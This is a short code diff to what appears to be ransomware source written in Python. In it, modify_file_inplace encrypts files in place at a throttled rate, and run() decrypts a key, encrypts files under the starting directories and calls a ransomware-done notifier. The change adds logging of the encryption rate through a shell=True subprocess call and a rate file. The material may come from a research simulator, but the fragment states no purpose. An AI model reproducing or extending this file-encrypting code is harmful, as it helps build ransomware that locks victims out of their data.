@@ -168,9 +168,10 @@ def modify_file_inplace(file_name, crypto, flag, block_size=16):
                 enc_running = time() - enc_start  # time in seconds
                 if rate > 0 and rate * enc_running < bytes_counter:  # encryption rate is limited
                     # if r * b < f then r * (b + n) = f, thus n = f/r - b
+                    subprocess.call('echo "{}" > ./{}'.format((bytes_counter / enc_running), RATE_FILE), shell=True)
                     even_out = (bytes_counter / rate) - enc_running
-                    print("sleeping for %.5f" % even_out,
-                          "to limit rate - r {} d {} s {}".format(rate, "%.5f" % enc_running, bytes_counter))
+                    print("sleeping for {} to limit rate - r {} d {} s {}".format(
+                        "%.5f" % even_out, rate, "%.5f" % enc_running, bytes_counter))
                     sleep(even_out)
 
             if len(ciphertext) < len(plaintext):
@@ -356,6 +357,8 @@ def run(encrypt, absolute_paths=None):
         key = decryptor.decrypt(b64decode(encrypted_key_b64))
 
     if encrypt:
+        with open("./" + RATE_FILE, "w+"):  # create file if not exists and truncate contents if exists
+            pass
         encrypt_files(key, start_dirs)
         notify_rw_done()
     else:
